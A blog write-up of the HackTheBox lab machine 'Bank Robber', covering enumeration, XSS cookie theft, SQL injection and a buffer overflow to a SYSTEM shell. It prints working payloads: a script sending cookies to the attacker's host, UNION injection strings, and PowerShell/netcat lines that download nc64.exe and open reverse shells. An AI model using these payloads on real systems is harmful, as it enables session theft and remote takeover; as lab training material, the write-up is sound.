## layout: post

title: Bank Robber
author: Mitchell Stein
tags:

- jekyll theme
- jekyll
  date: 2021-11-27
  tags: [write up, hackthebox, Windows]
  categories: [Practice]
  toc: true

---

Bank Robber is a machine hosted by HackTheBox that requires more XSS, cookies, and SQL knowledge.

## Enumeration

### Nmap

```zsh
$ nmap -sC -sV -o nmap 10.10.10.154
# Nmap 7.91 scan initiated Mon Jul 26 11:18:06 2021 as: nmap -sC -sV -o nmap 10.10.10.154
Nmap scan report for 10.10.10.154
Host is up (0.087s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5m26s, deviation: 0s, median: 5m26s
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-07-26T15:23:57
|_  start_date: 2021-07-26T15:23:11
```

Some interesting ports to take notice of are 3306, 445, and the web ports 80 and 443.

### MySQL

```zsh
┌──(root💀kali-linux-2021-1)-[/home/parallels]
└─# mysql -h 10.10.10.154 --port 3306
    ERROR 1130 (HY000): Host '10.10.14.31' is not allowed to connect to this MariaDB server
```

No luck with any connection to MySQL, this usually seems the norm for these type of boxes.

### CrackMapExec

Sadly similarly to the MySQL ports, we have no access or lucky breaks with the smb ports either.

```zsh
┌──(root💀kali-linux-2021-1)-[/home/parallels]
└─# crackmapexec smb 10.10.10.154 -u '' -
    SMB         10.10.10.154    445    BANKROBBER       [*] Windows 10 Pro 14393 (name:BANKROBBER) (domain:Bankrobber) (signing:False) (SMBv1:True)
    SMB         10.10.10.154    445    BANKROBBER       [-] Bankrobber\: STATUS_ACCESS_DENIED

┌──(root💀kali-linux-2021-1)-[/home/parallels]
└─# crackmapexec smb 10.10.10.154 -u 'guest' -p ''
    SMB         10.10.10.154    445    BANKROBBER       [*] Windows 10 Pro 14393 (name:BANKROBBER) (domain:Bankrobber) (signing:False) (SMBv1:True)
    SMB         10.10.10.154    445    BANKROBBER       [-] Bankrobber\guest: STATUS_LOGON_FAILURE
```

### Website

The website has a pretty standard looking login page with some opportunities to input data in fields and trade E-Coin.

In this E-Coin transfer window we can actually perform some XSS!

![Bank Robber](https://mitchelldstein.github.io/assets/images/BankRobber/XSS.png)

Hosting this image on our Kali machine can see it did reach out and get the image!

```zsh
┌──(root💀kali-linux-2021-1)-[/home/parallels]
└─# sudo nc -nlvp 80
    connect to [10.10.14.31] from (UNKNOWN) [10.10.10.154] 49796
    GET /testing HTTP/1.1
    Referer: http://localhost/admin/index.php
    User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
    Accept: */*
    Connection: Keep-Alive
    Accept-Encoding: gzip, deflate
    Accept-Language: en-GB,*
    Host: 10.10.14.31
```

Upon submitting this trade we also see an alert window stating an admin will review the trade. This immediately got me thinking we can use XSS to grab the admin session cookie and authenticate as that user.

---

## Intercepting Cookies￼

Performing the same method as above, sending a trade with some imbedded XSS can give us the admin cookie as soon as the admin account opens the trade.

```javascript
<script>
  new Image().src="http://10.10.14.31/Craz3.php?output="%2bdocument.cookie;
</script>
```

We get the following reply back:

![XSS Reply](https://mitchelldstein.github.io/assets/images/BankRobber/Burp.png)

```zsh
┌──(root💀kali-linux-2021-1)-[/home/parallels]
└─# echo -n 'YWRtaW4=' | base64 -d
    admin

┌──(root💀kali-linux-2021-1)-[/home/parallels]
└─# echo -n 'SG9wZWxlc3Nyb21hbnRpYw==' | base64 -d
    Hopelessromantic
```

---

## Admin WebApp

Using the new admin credentials, logging into the site now provides a table of transactions to review along with some SQL search fields of user accounts.

### SQL INJECTION

Testing the field instantly gives an SQL error.

![SQL Injection](https://mitchelldstein.github.io/assets/images/BankRobber/SQL.png)

Below is some enumeration through this injection.

```text
$ term=1' UNION ALL SELECT @@VERSION,2,3 -- -
    10.1.38-MariaDB
$ term=1' UNION ALL SELECT user(),2,3 -- -
    root@localhost
```

---

## Further XSS

The following XSS payload will abuse XHR functionality allowing us to upload a nc.exe program

```js
var request = new XMLHttpRequest();
var params =
  'cmd=dir|powershell -c "iwr -uri 10.10.14.31/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.31 443';
request.open("POST", "http://localhost/admin/backdoorchecker.php", true);
request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
request.send(params);
```

In order for this script to do what it needs to we must first make sure we have an http server running to upload the nc.exe file.

```zsh
sudo python3 -m http.server 80
```

Having out NetCat session open also allows us to get a reverse shell from the uploaded XHR exploit.

```zsh
rlwrap nc -nlvp 4444
```

## User Shell

### Windows Enumeration

To enumerate the box my favorite tool is WinPEAS

To get this onto the machine, load up smb server on linux machine to allow windows to grab the file through the victim PC

```zsh
sudo impacket-smbserver share .
```

Transfer over winPEASx64.exe to enumerate the system

```cmd
C:\ copy \\10.10.14.31\cthulhu\winPEASx64.exe .
```

Using this tool we found a very perculiar localhost listening port on 910.

Forward port 910 to internal chisel server.

On the windows machine:

```cmd
C:\ copy \\10.10.14.31\share\chisel.exe .
.\chisel.exe client 10.10.14.31:18110 R:910:localhost:910
```

On your local Kali machine:

```zsh
./chisel server -p 18110 --reverse
```

---

## Buffer Overflow

Under port 910 there is an executable we can exploit with a buffer overflow.

```cmd
Internet E-Coin Transfer System
International Bank of Sun church
v0.1 by Gio & Cneeliz

---

Please enter your super secret 4 digit PIN code to login:
[$] 0021
[$] PIN is correct, access granted!
```
Using the example in my [Buffer Overflow Overview](https://mitchelldstein.github.io/tools/2021/11/02/buffer-overflow/), we can craft an exploit to get a shell through this program.

```
/usr/bin/msf-pattern_create -l 100

┌──(root💀kali-linux-2021-1)-[/home/parallels]
└─#nc localhost 910
    --------------------------------------------------------------
    Internet E-Coin Transfer System
    International Bank of Sun church
                                            v0.1 by Gio & Cneeliz
    --------------------------------------------------------------
    Please enter your super secret 4 digit PIN code to login:
    [$] 0021
    [$] PIN is correct, access granted!

Enter:
$ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9AbC:\users\cortin\nc64.exe 10.10.14.31 8443 -e cmd
```

```zsh
┌──(root💀kali-linux-2021-1)-[/home/parallels]
└─# rlwrap nc -nlvp 8443
. . .
Connect to [10.10.14.31] from (UNKNOWN) [10.10.10.154] 49803
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

C:\Windows\system32>whoami
whoami
nt authority\system
```